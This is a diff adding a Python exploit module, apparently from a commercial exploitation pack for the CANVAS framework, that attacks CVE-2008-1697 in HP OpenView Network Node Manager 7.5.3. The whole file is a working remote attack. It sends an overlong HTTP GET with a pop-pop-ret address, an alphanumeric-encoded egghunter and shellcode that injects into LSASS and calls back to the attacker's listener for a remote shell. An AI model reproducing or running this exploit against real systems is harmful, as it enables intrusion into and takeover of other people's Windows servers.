@@ -1,0 +1,141 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+
+import sys
+
+if "." not in sys.path:
+    sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "HP OpenView Network Node Manager 7.5.3 Stack Overflow"
+
+DESCRIPTION = "Stack overflow vulnerability in HP OpenView Network Node Manager 7.5.3"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "2008.04.02"
+DOCUMENTATION["References"] = "http://www.milw0rm.com/exploits/5342"
+DOCUMENTATION["Versions Affected"] = "HP OpenView NNM 7.5.3"
+DOCUMENTATION["CVE Name"] = "CVE-2008-1697"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1697"
+
+VERSION = "1.0"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000", "2003" ]
+
+NOTES = """
+"""
+
+CHANGELOG = """
+"""
+
+targets = {    
+    0: ['HP OpenView NNM 7.5.3',  0x5a446a59],  # pop pop ret @ ovutil.dll
+}  
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        
+        self.port = 7510
+        self.host = ""                         
+        self.name = NAME   
+        self.badstring = "\x00"     
+        return
+        
+    def neededListenerTypes(self):
+        return [canvasengine.WIN32MOSDEF]
+				
+    def createShellcode(self):
+        host = self.callback.ip
+        port = self.callback.port
+
+        return self.createHeapSafeInjectIntoProcess(self.badstring, host, port, smallcode=1, processname="LSASS.EXE", backupprocess="lsass.exe")
+				
+    
+    def run(self):	    		
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+                
+        try:            
+            s = self.gettcpsock()
+            s.connect((self.host, self.port))                      
+            s.sendall(sploitstring)            
+                        
+        except:            
+            self.log("Attack reported no open socket - service died?")
+            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME, self.host, self.port))
+            return 0
+        
+        self.setInfo("%s attacking %s:%d - done (success!)"%(NAME, self.host, self.port))
+        
+        return 1
+                				
+    def makesploit(self):
+        """
+        Construct the attack        			  				
+        """
+        
+        os_name, pop_pop_ret = targets[self.version]
+				
+        ret = struct.pack('<L', pop_pop_ret)
+        
+        egghunter=(
+        "%JMNU%521*TX-1MUU-1KUU-5QUUP\AA%J"
+        "MNU%521*-!UUU-!TUU-IoUmPAA%JMNU%5"
+        "21*-q!au-q!au-oGSePAA%JMNU%521*-D"
+        "A~X-D4~X-H3xTPAA%JMNU%521*-qz1E-1"
+        "z1E-oRHEPAA%JMNU%521*-3s1--331--^"
+        "TC1PAA%JMNU%521*-E1wE-E1GE-tEtFPA"
+        "A%JMNU%521*-R222-1111-nZJ2PAA%JMN"
+        "U%521*-1-wD-1-wD-8$GwP")
+
+        data_1 = "\xeb"*1101 + "\x41\x41\x41\x41\x77\x21" + ret + "G"*32 + egghunter + "A"*100 + ":7510"
+        data_2 = "\x90"*34 + "\x83\xc4\x03"
+	
+        sploitstring = "GET http://" + data_1 + "/topology/homeBaseView HTTP/1.1\r\n"
+        sploitstring += "Content-Type: application/x-www-form-urlencoded\r\n"
+        sploitstring += "User-Agent: User-Agent: Mozilla/4.0 (MSIE 6.0; Windows NT 5.1)\r\n"
+        sploitstring += "Content-Length: " + str(len(self.shellcode) + len(data_2) + 8)+ "\r\n\r\n"
+        sploitstring += "T00WT00W" + data_2 + self.shellcode 
+      
+        return sploitstring
+        
+    def usage(self):
+        print 'Usage: %s -v version -t host -l localIP -d localPort'%(sys.argv[0])
+        
+        i = 0
+        
+        print 'Available versions:'
+        
+        for listline in targets.values():
+            print '\t%d: %s'%(i, listline[0])
+            i = i + 1
+        
+        sys.exit(0) 
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION, VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
+    
